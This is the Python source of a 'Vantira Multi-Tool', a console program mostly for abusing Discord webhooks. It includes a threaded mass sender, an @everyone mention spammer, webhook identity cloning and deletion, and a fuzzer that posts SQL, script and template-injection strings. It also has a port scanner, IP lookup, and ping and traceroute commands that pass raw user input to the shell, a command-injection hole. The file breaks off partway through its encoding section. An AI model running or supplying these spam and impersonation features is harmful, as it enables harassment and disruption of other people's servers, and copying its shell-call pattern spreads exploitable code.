"""
Vantira Multi-Tool v3.0
requires: pip install requests rich
"""

import os, sys, json, time, base64, socket, random, string
import threading, hashlib, urllib.parse, struct, ipaddress
from datetime   import datetime, timezone
from queue      import Queue

# ── rich ──────────────────────────────────────────────────────
from rich.console   import Console
from rich.text      import Text
from rich.live      import Live
from rich.panel     import Panel
from rich.columns   import Columns
from rich.align     import Align
from rich           import box

console = Console(highlight=False)

# ── requests (optional — graceful fallback msg) ────────────────
try:
    import requests as _req
    HAS_REQ = True
except ImportError:
    HAS_REQ = False

# ═════════════════════════════════════════════════════════════
#  PALETTE  —  purple / violet / blue / pink only
# ═════════════════════════════════════════════════════════════
HUE_MIN    = 0.63   # blue-violet
HUE_MAX    = 0.90   # pink-magenta
WAVE_SPEED = 0.006  # phase per frame — very slow drift
SPREAD     = 0.020  # hue delta per column

LOGO = [
    "  ██╗   ██╗ █████╗ ███╗   ██╗████████╗██╗██████╗  █████╗ ",
    "  ██║   ██║██╔══██╗████╗  ██║╚══██╔══╝██║██╔══██╗██╔══██╗",
    "  ██║   ██║███████║██╔██╗ ██║   ██║   ██║██████╔╝███████║",
    "  ╚██╗ ██╔╝██╔══██║██║╚██╗██║   ██║   ██║██╔══██╗██╔══██║",
    "   ╚████╔╝ ██║  ██║██║ ╚████║   ██║   ██║██║  ██║██║  ██║",
    "    ╚═══╝  ╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝   ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝",
]

VERSION = "4.0"
WEBHOOK = None
PROXY   = None
LOG     = []   # [(ts, action, result)]

# =============================================================
#  CONFIG SYSTEM
#  creates vantira_data/ next to the .py file automatically
# =============================================================
_BASE_DIR    = os.path.dirname(os.path.abspath(__file__))
_DATA_DIR    = os.path.join(_BASE_DIR, "vantira_data")
_CONFIG_FILE = os.path.join(_DATA_DIR, "config.json")

_DEFAULT_CFG = {
    "webhook"      : "",
    "proxy"        : "",
    "theme_hue_min": 0.63,
    "theme_hue_max": 0.90,
    "wave_speed"   : 0.006,
    "show_dashboard": True,
    "autosave"     : True,
}


def _ensure_data_dir():
    os.makedirs(_DATA_DIR, exist_ok=True)
    os.makedirs(os.path.join(_DATA_DIR, "ip_logs"), exist_ok=True)
    os.makedirs(os.path.join(_DATA_DIR, "exports"), exist_ok=True)
    readme = os.path.join(_DATA_DIR, "README.txt")
    if not os.path.exists(readme):
        with open(readme, "w") as f:
            f.write("Vantira Multi-Tool - data folder\n")
            f.write("config.json     saved settings (webhook, proxy, theme)\n")
            f.write("ip_logs/        IP logger hit exports\n")
            f.write("exports/        OSINT / scan result exports\n")
            f.write("\nDO NOT share config.json - it contains your webhook.\n")


def cfg_load() -> dict:
    _ensure_data_dir()
    if not os.path.exists(_CONFIG_FILE):
        return dict(_DEFAULT_CFG)
    try:
        with open(_CONFIG_FILE, "r") as f:
            data = json.load(f)
        cfg = dict(_DEFAULT_CFG)
        cfg.update(data)
        return cfg
    except Exception:
        return dict(_DEFAULT_CFG)


def cfg_save(cfg: dict):
    _ensure_data_dir()
    try:
        tmp = _CONFIG_FILE + ".tmp"
        with open(tmp, "w") as f:
            json.dump(cfg, f, indent=2)
        os.replace(tmp, _CONFIG_FILE)
    except Exception:
        pass


def cfg_apply(cfg: dict):
    global WEBHOOK, PROXY, HUE_MIN, HUE_MAX, WAVE_SPEED
    if cfg.get("webhook"):
        WEBHOOK = cfg["webhook"]
    if cfg.get("proxy"):
        PROXY = {"http": cfg["proxy"], "https": cfg["proxy"]}
    if cfg.get("theme_hue_min"):
        HUE_MIN = float(cfg["theme_hue_min"])
    if cfg.get("theme_hue_max"):
        HUE_MAX = float(cfg["theme_hue_max"])
    if cfg.get("wave_speed"):
        WAVE_SPEED = float(cfg["wave_speed"])


def cfg_current() -> dict:
    return {
        "webhook"       : WEBHOOK or "",
        "proxy"         : list(PROXY.values())[0] if PROXY else "",
        "theme_hue_min" : HUE_MIN,
        "theme_hue_max" : HUE_MAX,
        "wave_speed"    : WAVE_SPEED,
        "show_dashboard": True,
        "autosave"      : True,
    }


def misc_settings():
    global HUE_MIN, HUE_MAX, WAVE_SPEED
    _header("SETTINGS")
    console.print(f"  [grey50]config  : {_CONFIG_FILE}[/grey50]")
    console.print(f"  [grey50]data dir: {_DATA_DIR}[/grey50]\n")

    cfg = cfg_load()
    console.print(f"  [bold white]current:[/bold white]\n")
    wh_short = (cfg.get("webhook") or "—")
    wh_short = wh_short[:60] + "..." if len(wh_short) > 60 else wh_short
    console.print(f"  [cyan]{'webhook':>16}[/cyan]  [white]{wh_short}[/white]")
    console.print(f"  [cyan]{'proxy':>16}[/cyan]  [white]{cfg.get('proxy') or '—'}[/white]")
    console.print(f"  [cyan]{'hue min':>16}[/cyan]  [white]{cfg.get('theme_hue_min',0.63)}[/white]  [grey50](wave color start)[/grey50]")
    console.print(f"  [cyan]{'hue max':>16}[/cyan]  [white]{cfg.get('theme_hue_max',0.90)}[/white]  [grey50](wave color end)[/grey50]")
    console.print(f"  [cyan]{'wave speed':>16}[/cyan]  [white]{cfg.get('wave_speed',0.006)}[/white]  [grey50](0.002=slow 0.02=fast)[/grey50]")
    console.print()
    console.print("  [grey50]1[/grey50]  edit webhook")
    console.print("  [grey50]2[/grey50]  edit proxy")
    console.print("  [grey50]3[/grey50]  wave color range")
    console.print("  [grey50]4[/grey50]  wave speed")
    console.print("  [grey50]5[/grey50]  save session state now")
    console.print("  [grey50]6[/grey50]  reset to defaults")
    console.print("  [grey50]7[/grey50]  open data folder")
    console.print("  [grey50]0[/grey50]  back\n")

    choice = _ask("select: ")

    if choice == "1":
        val = _ask("new webhook (blank=keep): ").strip()
        if val:
            cfg["webhook"] = val
            WEBHOOK = val
        cfg_save(cfg); _ok("saved")

    elif choice == "2":
        val = _ask("proxy url (blank=clear): ").strip()
        cfg["proxy"] = val
        if val:
            PROXY = {"http": val, "https": val}
        else:
            PROXY = None
        cfg_save(cfg); _ok("saved")

    elif choice == "3":
        try:
            lo = float(_ask(f"hue min (current {HUE_MIN}): ") or HUE_MIN)
            hi = float(_ask(f"hue max (current {HUE_MAX}): ") or HUE_MAX)
            HUE_MIN = cfg["theme_hue_min"] = round(max(0.0, min(1.0, lo)), 3)
            HUE_MAX = cfg["theme_hue_max"] = round(max(0.0, min(1.0, hi)), 3)
            cfg_save(cfg); _ok("saved - takes effect next menu refresh")
        except: _err("invalid value")

    elif choice == "4":
        try:
            spd = float(_ask(f"speed (current {WAVE_SPEED}): ") or WAVE_SPEED)
            WAVE_SPEED = cfg["wave_speed"] = round(max(0.001, min(0.05, spd)), 4)
            cfg_save(cfg); _ok("saved")
        except: _err("invalid value")

    elif choice == "5":
        cfg_save(cfg_current())
        _ok(f"saved to {_CONFIG_FILE}")

    elif choice == "6":
        if _ask("reset everything? (y/N): ").lower() == "y":
            cfg_save(dict(_DEFAULT_CFG))
            cfg_apply(dict(_DEFAULT_CFG))
            _ok("reset to defaults")

    elif choice == "7":
        if os.name == "nt":
            os.startfile(_DATA_DIR)
        elif sys.platform == "darwin":
            os.system(f'open "{_DATA_DIR}"')
        else:
            os.system(f'xdg-open "{_DATA_DIR}"')
        _ok(f"opened: {_DATA_DIR}")

    _pause()


# ═════════════════════════════════════════════════════════════
#  WAVE ENGINE — direct stdout, 60fps, no rich overhead
# ═════════════════════════════════════════════════════════════

def _hsv(h: float):
    h = HUE_MIN + (h % 1.0) * (HUE_MAX - HUE_MIN)
    h6 = h * 6.0
    i  = int(h6) % 6
    f  = h6 - int(h6)
    lut = [
        (1., f,  0.), (1-f, 1., 0.), (0., 1., f),
        (0., 1-f, 1.), (f, 0., 1.), (1., 0., 1-f),
    ]
    r, g, b = lut[i]
    return int(r*255), int(g*255), int(b*255)


def _render_logo_raw(phase: float) -> str:
    """
    Render the logo as a raw ANSI string — one write per frame.
    No rich parsing overhead. Each non-space char gets its own
    \033[38;2;R;G;Bm escape. \033[2K clears line before rewrite.
    """
    out = ["\033[1m"]
    for line in LOGO:
        out.append("\033[2K")
        for col, ch in enumerate(line):
            if ch == " ":
                out.append(" ")
            else:
                r, g, b = _hsv((phase + col * SPREAD) % 1.0)
                out.append(f"\033[38;2;{r};{g};{b}m{ch}")
        out.append("\n")
    out.append("\033[0m")
    return "".join(out)


_frozen_phase = 0.0


def _frozen_logo() -> Text:
    """Rich Text version of logo at frozen phase — used in menus."""
    t = Text(no_wrap=True)
    for line in LOGO:
        for col, ch in enumerate(line):
            if ch == " ":
                t.append(" ")
            else:
                r, g, b = _hsv((_frozen_phase + col * SPREAD) % 1.0)
                t.append(ch, style=f"bold rgb({r},{g},{b})")
        t.append("\n")
    return t


# ═════════════════════════════════════════════════════════════
#  INTRO — direct stdout wave, 60fps, buttery smooth
# ═════════════════════════════════════════════════════════════
def intro():
    global _frozen_phase

    LOGO_H       = len(LOGO)
    FPS          = 60
    DURATION     = 3.2
    FRAMES       = int(FPS * DURATION)
    INTERVAL     = 1.0 / FPS
    INTRO_SPEED  = WAVE_SPEED * 4.0   # faster during intro for visual pop
    JUMP         = LOGO_H + 3         # lines to rewind each frame

    phase = 0.0

    sys.stdout.write("\033[?25l")    # hide cursor
    sys.stdout.flush()

    try:
        # plant the initial block so cursor-up has something to rewind into
        sys.stdout.write("\n")
        sys.stdout.write(_render_logo_raw(phase))
        sys.stdout.write(
            f"\033[2K\033[38;2;100;60;160m"
            f"        M U L T I - T O O L   v{VERSION}"
            f"\033[0m\n\033[2K\n"
        )
        sys.stdout.flush()

        for frame in range(FRAMES):
            t0    = time.perf_counter()
            phase = (phase + INTRO_SPEED) % 1.0

            # subtitle fades in over first 30 frames
            alpha = min(1.0, frame / 30.0)
            sr    = int(100 * alpha)
            sg    = int(60  * alpha)
            sb    = int(160 * alpha)

            # entire frame as one string — single write = zero flicker
            buf = (
                f"\033[{JUMP}A"           # cursor back to top of block
                f"\033[2K\n"             # clear+rewrite leading newline
                + _render_logo_raw(phase)
                + f"\033[2K\033[38;2;{sr};{sg};{sb}m"
                  f"        M U L T I - T O O L   v{VERSION}"
                  f"\033[0m\n\033[2K\n"
            )
            sys.stdout.write(buf)
            sys.stdout.flush()

            elapsed = time.perf_counter() - t0
            gap = INTERVAL - elapsed
            if gap > 0.001:
                time.sleep(gap)

    except KeyboardInterrupt:
        pass
    finally:
        sys.stdout.write("\033[?25h\n")
        sys.stdout.flush()

    _frozen_phase = phase


# ═════════════════════════════════════════════════════════════
#  HELPERS
# ═════════════════════════════════════════════════════════════
def wipe():  os.system("cls" if os.name == "nt" else "clear")

def _log(action, result):
    LOG.append((datetime.now().strftime("%H:%M:%S"), action, str(result)))

def _need_req():
    if not HAS_REQ:
        console.print("[red][!][/red] requests not installed — run: [cyan]pip install requests[/cyan]")
        _pause(); return False
    return True

def _need_wh():
    if not WEBHOOK:
        console.print("[red][!][/red] no webhook set — use option 1 first")
        _pause(); return False
    return True

def _pause():
    console.input("\n  [grey50]press enter...[/grey50]")

def _ok(msg):    console.print(f"  [bold green][+][/bold green] {msg}")
def _err(msg):   console.print(f"  [bold red][!][/bold red] {msg}")
def _info(msg):  console.print(f"  [bold blue][i][/bold blue] {msg}")
def _warn(msg):  console.print(f"  [bold yellow][~][/bold yellow] {msg}")
def _ask(msg):   return console.input(f"  [bold yellow][?][/bold yellow] {msg}").strip()

def _header(title: str):
    wipe()
    console.print(_frozen_logo())
    console.print(f"  [grey50]{'─'*60}[/grey50]")
    console.print(f"\n  [bold white][ {title} ][/bold white]\n")

def _session():
    if not HAS_REQ: raise RuntimeError("requests missing")
    s = _req.Session()
    s.headers["User-Agent"] = (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
    )
    if PROXY: s.proxies.update(PROXY)
    return s

def _429(r):
    if r.status_code == 429:
        wait = r.json().get("retry_after", 1)
        _warn(f"rate limited — sleeping {wait:.1f}s")
        time.sleep(float(wait))
        return True
    return False

def _icon(code):
    if code in (200, 204): return "[green]✓[/green]"
    if code == 429:        return "[yellow]↻[/yellow]"
    return f"[red]✗ {code}[/red]"


# ═════════════════════════════════════════════════════════════
#  ── SECTION 1 : DISCORD WEBHOOK ────────────────────────────
# ═════════════════════════════════════════════════════════════

def wh_set():
    global WEBHOOK
    _header("SET WEBHOOK")
    url = _ask("paste webhook url: ")
    if "discord" not in url or not url.startswith("https://"):
        _err("doesn't look like a Discord webhook"); _pause(); return
    try:
        r = _session().get(url, timeout=10)
        if r.status_code == 200:
            WEBHOOK = url
            d = r.json()
            _ok(f"connected → [white]{d.get('name','?')}[/white]  "
                f"channel: [cyan]{d.get('channel_id','?')}[/cyan]  "
                f"guild: [cyan]{d.get('guild_id','?')}[/cyan]")
            _log("SET_WH", "ok")
            if cfg_load().get("autosave"): cfg_save(cfg_current())
        else: _err(f"bad response [{r.status_code}]")
    except Exception as e: _err(str(e))
    _pause()

def wh_quick():
    if not _need_req() or not _need_wh(): return
    _header("QUICK FIRE")
    console.print("  [grey50]blank line = back[/grey50]\n")
    while True:
        msg = console.input("  [green]»[/green] ")
        if not msg.strip(): return
        try:
            r = _session().post(WEBHOOK, json={"content": msg}, timeout=10)
            console.print(f"  [grey50]└[/grey50] {_icon(r.status_code)}")
            _429(r)
        except Exception as e: _err(str(e))

def wh_send():
    if not _need_req() or not _need_wh(): return
    _header("SEND MESSAGE")
    user    = _ask("username override (blank=default): ")
    avatar  = _ask("avatar url (blank=default): ")
    content = _ask("message content: ")
    tts     = _ask("tts? (y/N): ").lower() == "y"
    role_id = _ask("ping role id (blank=none): ")
    user_id = _ask("ping user id (blank=none): ")
    prefix  = ""
    if role_id: prefix += f"<@&{role_id}> "
    if user_id: prefix += f"<@{user_id}> "
    p = {"content": prefix + content, "tts": tts}
    if user:   p["username"]   = user
    if avatar: p["avatar_url"] = avatar
    try:
        r = _session().post(WEBHOOK, json=p, timeout=10)
        _ok("sent!") if r.status_code in (200,204) else _err(f"{r.status_code}: {r.text[:100]}")
        _log("SEND_MSG", r.status_code)
    except Exception as e: _err(str(e))
    _pause()

def wh_embed():
    if not _need_req() or not _need_wh(): return
    _header("EMBED BUILDER")
    title   = _ask("title: ")
    desc    = _ask("description: ")
    color   = _ask("hex color (blank=random): ")
    footer  = _ask("footer text (blank=none): ")
    image   = _ask("image url (blank=none): ")
    thumb   = _ask("thumbnail url (blank=none): ")
    author  = _ask("author name (blank=none): ")
    ts      = _ask("timestamp? (y/N): ").lower() == "y"
    try:    col = int(color, 16) if color else int(os.urandom(3).hex(), 16)
    except: col = 0x7B2FBE
    embed = {"title": title, "description": desc, "color": col}
    if footer: embed["footer"]    = {"text": footer}
    if image:  embed["image"]     = {"url": image}
    if thumb:  embed["thumbnail"] = {"url": thumb}
    if author: embed["author"]    = {"name": author}
    if ts:     embed["timestamp"] = datetime.now(timezone.utc).isoformat()
    fields = []
    console.print("\n  [grey50]add fields — blank name = done[/grey50]")
    while len(fields) < 25:
        fn = _ask(f"  field {len(fields)+1} name (blank=done): ")
        if not fn: break
        fv = _ask(f"  field {len(fields)+1} value: ")
        fi = _ask("  inline? (Y/n): ").lower() != "n"
        fields.append({"name": fn, "value": fv, "inline": fi})
    if fields: embed["fields"] = fields
    try:
        r = _session().post(WEBHOOK, json={"embeds": [embed]}, timeout=10)
        _ok("embed sent!") if r.status_code in (200,204) else _err(r.text[:200])
        _log("EMBED", r.status_code)
    except Exception as e: _err(str(e))
    _pause()

def wh_file():
    if not _need_req() or not _need_wh(): return
    _header("SEND FILE")
    path = _ask("file path: ")
    if not os.path.isfile(path): _err("file not found"); _pause(); return
    size = os.path.getsize(path)
    if size > 8*1024*1024: _warn(f"file is {size//1024//1024}MB — Discord limit ≈ 8MB")
    msg     = _ask("optional message: ")
    spoiler = _ask("spoiler? (y/N): ").lower() == "y"
    fname   = ("SPOILER_" if spoiler else "") + os.path.basename(path)
    try:
        s = _session()
        with open(path,"rb") as f:
            r = s.post(WEBHOOK, data={"content":msg} if msg else {},
                       files={"file":(fname,f)}, timeout=60)
        _ok(f"uploaded ({size//1024}KB)") if r.status_code in (200,204) else _err(r.text[:200])
        _log("FILE", r.status_code)
    except Exception as e: _err(str(e))
    _pause()

def wh_mass():
    if not _need_req() or not _need_wh(): return
    _header("MASS SEND  [threaded]")
    content = _ask("message: ")
    try:
        count   = int(_ask("total count: "))
        threads = max(1, min(int(_ask("threads (1-20): ")), 20))
        delay   = float(_ask("per-thread delay (s, 0=max): "))
    except: _err("invalid"); _pause(); return
    q   = Queue()
    ok_ = [0]; er_ = [0]
    lk  = threading.Lock()
    for _ in range(count): q.put({"content": content})
    def worker():
        while True:
            try: p = q.get_nowait()
            except: return
            while True:
                try:
                    r = _session().post(WEBHOOK, json=p, timeout=15)
                    if r.status_code in (200,204):
                        with lk: ok_[0]+=1; break
                    elif r.status_code == 429:
                        time.sleep(float(r.json().get("retry_after",1)))
                    else:
                        with lk: er_[0]+=1; break
                except:
                    with lk: er_[0]+=1; break
            if delay: time.sleep(delay)
            q.task_done()
    pool = [threading.Thread(target=worker, daemon=True) for _ in range(threads)]
    console.print()
    for t in pool: t.start()
    start = time.time()
    while not q.empty() or any(t.is_alive() for t in pool):
        done = ok_[0]+er_[0]
        bw   = 38
        fill = int(bw*done/max(count,1))
        bar  = "[green]"+"█"*fill+"[/green][grey50]"+"░"*(bw-fill)+"[/grey50]"
        elapsed = time.time()-start
        rate = done/elapsed if elapsed else 0
        console.print(f"\r  {bar} {int(100*done/max(count,1)):>3}%  "
                      f"[green]{ok_[0]}✓[/green] [red]{er_[0]}✗[/red]  "
                      f"[grey50]{rate:.1f}/s[/grey50]", end="")
        time.sleep(0.25)
    for t in pool: t.join()
    console.print()
    _ok(f"done — {ok_[0]} sent, {er_[0]} failed in {time.time()-start:.1f}s")
    _log("MASS", f"ok={ok_[0]} err={er_[0]}")
    _pause()

def wh_info():
    if not _need_req() or not _need_wh(): return
    _header("WEBHOOK RECON")
    try:
        r = _session().get(WEBHOOK, timeout=10)
        if r.status_code != 200: _err(f"{r.status_code}"); _pause(); return
        d = r.json()
    except Exception as e: _err(str(e)); _pause(); return
    for k,v in d.items():
        console.print(f"  [cyan]{k:>18}[/cyan] : [white]{json.dumps(v)}[/white]")
    gid = d.get("guild_id"); cid = d.get("channel_id")
    if gid and cid:
        console.print(f"\n  [grey50]channel:[/grey50] [underline blue]https://discord.com/channels/{gid}/{cid}[/underline blue]")
    _log("WH_INFO","ok"); _pause()

def wh_edit():
    if not _need_req() or not _need_wh(): return
    _header("EDIT WEBHOOK")
    name   = _ask("new name (blank=skip): ")
    avi    = _ask("new avatar url (blank=skip): ")
    p = {}
    if name: p["name"] = name
    if avi:
        try:
            img  = _session().get(avi, timeout=10).content
            ext  = avi.rsplit(".",1)[-1].lower()
            mime = "gif" if ext=="gif" else ("png" if ext=="png" else "jpeg")
            p["avatar"] = f"data:image/{mime};base64," + base64.b64encode(img).decode()
            _info(f"avatar encoded ({len(img)//1024}KB)")
        except Exception as e: _err(f"avatar failed: {e}")
    if not p: _err("nothing to change"); _pause(); return
    try:
        r = _session().patch(WEBHOOK, json=p, timeout=10)
        _ok("updated!") if r.status_code==200 else _err(f"{r.status_code}: {r.text[:200]}")
        _log("WH_EDIT", r.status_code)
    except Exception as e: _err(str(e))
    _pause()

def wh_clone():
    if not _need_req() or not _need_wh(): return
    _header("CLONE WEBHOOK IDENTITY")
    src = _ask("source webhook url: ")
    try:
        r = _session().get(src, timeout=10)
        if r.status_code != 200: _err(f"{r.status_code}"); _pause(); return
        d   = r.json()
        p   = {"name": d.get("name","cloned")}
        avi = d.get("avatar"); sid = d.get("id","?")
        _info(f"cloning from: [white]{d.get('name','?')}[/white] (id: {sid})")
        if avi:
            cdn = f"https://cdn.discordapp.com/avatars/{sid}/{avi}.png?size=1024"
            img = _session().get(cdn, timeout=10).content
            ext = "gif" if avi.startswith("a_") else "png"
            p["avatar"] = f"data:image/{ext};base64," + base64.b64encode(img).decode()
        r2 = _session().patch(WEBHOOK, json=p, timeout=10)
        _ok("identity cloned!") if r2.status_code==200 else _err(r2.text[:200])
        _log("WH_CLONE", r2.status_code)
    except Exception as e: _err(str(e))
    _pause()

def wh_delete():
    if not _need_req() or not _need_wh(): return
    global WEBHOOK
    _header("DELETE WEBHOOK")
    _warn("this permanently destroys the webhook.")
    if _ask("type DELETE to confirm: ") != "DELETE": _info("cancelled"); _pause(); return
    try:
        r = _session().delete(WEBHOOK, timeout=10)
        if r.status_code == 204:
            _ok("webhook destroyed."); WEBHOOK = None
        else: _err(f"{r.status_code}")
        _log("WH_DELETE", r.status_code)
    except Exception as e: _err(str(e))
    _pause()

def wh_spam_mentions():
    if not _need_req() or not _need_wh(): return
    _header("MENTION SPAMMER")
    console.print("  [grey50]1[/grey50] @everyone  [grey50]2[/grey50] @here  [grey50]3[/grey50] custom IDs\n")
    mode = _ask("mode: ")
    try:
        count = int(_ask("repeat: "))
        delay = float(_ask("delay (s): "))
    except: _err("invalid"); _pause(); return
    ids = _ask("IDs (space separated, mode 3 only): ").split() if mode=="3" else []
    for i in range(count):
        if mode=="1":   p={"content":"@everyone","allowed_mentions":{"parse":["everyone"]}}
        elif mode=="2": p={"content":"@here","allowed_mentions":{"parse":["here"]}}
        else:
            mentions=" ".join(f"<@&{x}>" for x in ids)
            p={"content":mentions,"allowed_mentions":{"roles":ids,"parse":[]}}
        try:
            r = _session().post(WEBHOOK, json=p, timeout=10)
            console.print(f"  [{i+1}/{count}] {_icon(r.status_code)}")
            if _429(r): continue
        except Exception as e: _err(str(e))
        time.sleep(delay)
    _ok("done."); _pause()

def wh_scheduled():
    if not _need_req() or not _need_wh(): return
    _header("SCHEDULED SEND")
    content = _ask("message: ")
    ts_str  = _ask("fire at (YYYY-MM-DD HH:MM:SS local): ")
    try:    target = datetime.strptime(ts_str, "%Y-%m-%d %H:%M:%S").timestamp()
    except: _err("bad format"); _pause(); return
    if target <= time.time(): _err("time is in the past"); _pause(); return
    _info(f"waiting {int(target-time.time())}s — Ctrl+C to cancel")
    try:
        while time.time() < target:
            left = int(target-time.time())
            m,s  = divmod(left,60); h,m = divmod(m,60)
            console.print(f"\r  [magenta]T-{h:02d}:{m:02d}:{s:02d}[/magenta]", end="")
            time.sleep(0.5)
    except KeyboardInterrupt: console.print(); _warn("cancelled"); _pause(); return
    console.print()
    try:
        r = _session().post(WEBHOOK, json={"content":content}, timeout=10)
        _ok(f"fired!  {_icon(r.status_code)}"); _log("SCHED", r.status_code)
    except Exception as e: _err(str(e))
    _pause()

def wh_fuzz():
    if not _need_req() or not _need_wh(): return
    _header("FUZZ PAYLOADS")
    SETS = {
        "unicode":   ["\u202e","\u0000","\uffff","\u200b","𝕳𝖊𝖑𝖑𝖔"],
        "length":    ["A"*2000,"B"*4096,"C"*8000],
        "injection": ["'; DROP TABLE--","<script>alert(1)</script>","${7*7}","{{7*7}}","\x00\x01"],
        "rtl":       ["\u202egnihTemos","\u202e\u0041\u0042"],
        "emoji":     ["💀"*200,"😭"*500,"🔥"*300],
    }
    names = list(SETS.keys())
    for i,n in enumerate(names,1): console.print(f"  [cyan]{i}[/cyan]  {n}  ({len(SETS[n])} cases)")
    console.print(f"  [cyan]0[/cyan]  all\n")
    choice = _ask("select: ")
    if choice=="0": cases=[c for s in SETS.values() for c in s]
    else:
        try: cases=SETS[names[int(choice)-1]]
        except: _err("invalid"); _pause(); return
    for i,c in enumerate(cases,1):
        try:
            r=_session().post(WEBHOOK,json={"content":c},timeout=10)
            console.print(f"  [{i:>3}] {_icon(r.status_code)}  [grey50]{repr(c[:40])}[/grey50]")
            if _429(r): continue
        except Exception as e: _err(str(e))
        time.sleep(0.4)
    _ok("fuzz done."); _log("FUZZ",f"{len(cases)} cases"); _pause()

def wh_raw():
    if not _need_req() or not _need_wh(): return
    _header("RAW JSON PAYLOAD")
    _info("paste JSON, blank line to fire:")
    lines=[]
    while True:
        line=console.input("  ")
        if not line: break
        lines.append(line)
    try: p=json.loads("\n".join(lines))
    except Exception as e: _err(f"invalid json: {e}"); _pause(); return
    try:
        r=_session().post(WEBHOOK,json=p,timeout=10)
        _ok(f"fired [{r.status_code}]") if r.status_code in (200,204) else _err(r.text[:200])
        _log("RAW",r.status_code)
    except Exception as e: _err(str(e))
    _pause()

def wh_proxy():
    global PROXY
    _header("PROXY CONFIG")
    console.print(f"  current: [cyan]{PROXY or 'none'}[/cyan]\n")
    console.print("  [grey50]examples:  http://127.0.0.1:8080   socks5://127.0.0.1:1080[/grey50]\n")
    raw = _ask("proxy url (blank=clear): ")
    if not raw:
        PROXY=None; _ok("proxy cleared")
    else:
        PROXY={"http":raw,"https":raw}
        _ok(f"proxy set → {raw}")
        if cfg_load().get("autosave"): cfg_save(cfg_current())
        try:
            ip=_session().get("https://api.ipify.org?format=json",timeout=8).json().get("ip","?")
            _info(f"outbound IP: [cyan]{ip}[/cyan]")
        except: _warn("connectivity check failed")
    _pause()


# ═════════════════════════════════════════════════════════════
#  ── SECTION 2 : NETWORK TOOLS ───────────────────────────────
# ═════════════════════════════════════════════════════════════

def net_portscan():
    _header("PORT SCANNER")
    host = _ask("target host/ip: ")
    rng  = _ask("port range (e.g. 1-1024): ")
    try:
        lo,hi = map(int, rng.split("-"))
    except: _err("bad range"); _pause(); return
    try: ip = socket.gethostbyname(host)
    except: _err("could not resolve host"); _pause(); return
    _info(f"scanning {ip}  ports {lo}-{hi}")
    open_ports = []
    start = time.time()
    for port in range(lo, hi+1):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.35)
            if s.connect_ex((ip, port)) == 0:
                try:    svc = socket.getservbyport(port)
                except: svc = "?"
                open_ports.append((port, svc))
                console.print(f"  [green]OPEN[/green]  [white]{port:>5}[/white]  [grey50]{svc}[/grey50]")
            s.close()
        except: pass
    elapsed = time.time()-start
    _ok(f"{len(open_ports)} open ports found in {elapsed:.1f}s")
    _log("PORTSCAN", f"{len(open_ports)} open"); _pause()

def net_dns():
    _header("DNS LOOKUP")
    host = _ask("hostname: ")
    records = {}
    import socket as _s
    try:    records["A"]     = _s.gethostbyname(host)
    except: records["A"]     = "—"
    try:    records["FQDN"]  = _s.getfqdn(host)
    except: records["FQDN"]  = "—"
    try:
        ai = _s.getaddrinfo(host, None, _s.AF_INET6)
        records["AAAA"] = ai[0][4][0] if ai else "—"
    except: records["AAAA"] = "—"
    for k,v in records.items():
        console.print(f"  [cyan]{k:>8}[/cyan]  [white]{v}[/white]")
    _log("DNS", host); _pause()

def net_whois_ip():
    _header("IP INFO / WHOIS")
    ip_raw = _ask("ip address (blank=your ip): ")
    if not _need_req(): return
    target = ip_raw if ip_raw else ""
    url = f"https://ipinfo.io/{target}/json"
    try:
        r = _session().get(url, timeout=10)
        d = r.json()
        fields = ["ip","hostname","city","region","country","loc","org","postal","timezone"]
        for f in fields:
            if f in d:
                console.print(f"  [cyan]{f:>10}[/cyan]  [white]{d[f]}[/white]")
        _log("IPINFO", d.get("ip","?"))
    except Exception as e: _err(str(e))
    _pause()

def net_ping():
    _header("PING")
    host  = _ask("host: ")
    count = int(_ask("count (default 4): ") or "4")
    param = "-n" if os.name=="nt" else "-c"
    cmd   = f"ping {param} {count} {host}"
    _info(f"running: {cmd}")
    os.system(cmd)
    _log("PING", host); _pause()

def net_http_headers():
    if not _need_req(): return
    _header("HTTP HEADER INSPECTOR")
    url = _ask("url (include https://): ")
    try:
        r = _session().get(url, timeout=10, allow_redirects=True)
        console.print(f"\n  [grey50]status:[/grey50] [{'green' if r.status_code<400 else 'red'}]{r.status_code}[/{'green' if r.status_code<400 else 'red'}]")
        console.print(f"  [grey50]final url:[/grey50] [blue]{r.url}[/blue]\n")
        for k,v in sorted(r.headers.items()):
            console.print(f"  [cyan]{k:>32}[/cyan]  [white]{v}[/white]")
        _log("HTTP_HEADERS", url)
    except Exception as e: _err(str(e))
    _pause()

def net_traceroute():
    _header("TRACEROUTE")
    host = _ask("host: ")
    cmd  = f"tracert {host}" if os.name=="nt" else f"traceroute {host}"
    _info(f"running: {cmd}")
    os.system(cmd)
    _log("TRACEROUTE", host); _pause()

def net_ipcalc():
    _header("SUBNET CALCULATOR")
    cidr = _ask("network in CIDR (e.g. 192.168.1.0/24): ")
    try:
        net = ipaddress.ip_network(cidr, strict=False)
        console.print(f"  [cyan]{'network':>16}[/cyan]  [white]{net.network_address}[/white]")
        console.print(f"  [cyan]{'broadcast':>16}[/cyan]  [white]{net.broadcast_address}[/white]")
        console.print(f"  [cyan]{'netmask':>16}[/cyan]  [white]{net.netmask}[/white]")
        console.print(f"  [cyan]{'prefix':>16}[/cyan]  [white]/{net.prefixlen}[/white]")
        console.print(f"  [cyan]{'hosts':>16}[/cyan]  [white]{net.num_addresses - 2}[/white]")
        console.print(f"  [cyan]{'first host':>16}[/cyan]  [white]{list(net.hosts())[0] if net.num_addresses>2 else '—'}[/white]")
        console.print(f"  [cyan]{'last host':>16}[/cyan]  [white]{list(net.hosts())[-1] if net.num_addresses>2 else '—'}[/white]")
        console.print(f"  [cyan]{'version':>16}[/cyan]  [white]IPv{net.version}[/white]")
    except Exception as e: _err(str(e))
    _log("IPCALC", cidr); _pause()


# ═════════════════════════════════════════════════════════════
#  ── SECTION 3 : ENCODE / CRYPTO UTILS ───────────────────────
# ═════════════════════════════════════════════════════════════

def enc_b64():
    _header("BASE64")
    console.print("  [grey50]1[/grey50] encode  [grey50]2[/grey50] decode\n")
    mode = _ask("mode: ")
    data = _ask("input: ")
    try:
        if mode=="1":
            out = base64.b64encode(data.encode()).decode()
        else:
            out = base64.b64decode(data.encode()).decode(errors="replace")
        console.print(f"\n  [green]{out}[/green]")
    except Exception as e: _err(str(e))
